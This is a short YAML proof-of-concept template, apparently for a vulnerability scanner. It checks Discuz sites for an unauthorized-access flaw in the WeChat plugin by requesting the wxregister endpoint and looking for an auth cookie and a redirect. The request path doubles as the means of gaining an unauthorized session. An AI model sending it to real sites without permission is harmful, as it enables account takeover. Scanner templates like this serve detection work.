id: poc-yaml-discuz-wechat-plugins-unauth
info:
  name: Discuz Wechat Plugins 未授权访问漏洞
  severity: medium
  tags:
  - 访问控制错误
  finger: Discuz
  reference: []
  description: null
variables: {}
transport: http
requests:
- method: GET
  path: /plugin.php?id=wechat:wechat&ac=wxregister
  headers: {}
  data: null
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 302  && contains(headers, "set-cookie") && contains(headers,
    "auth") && contains(headers, "location") && contains(headers, "wsq.discuz.com")
  output: []
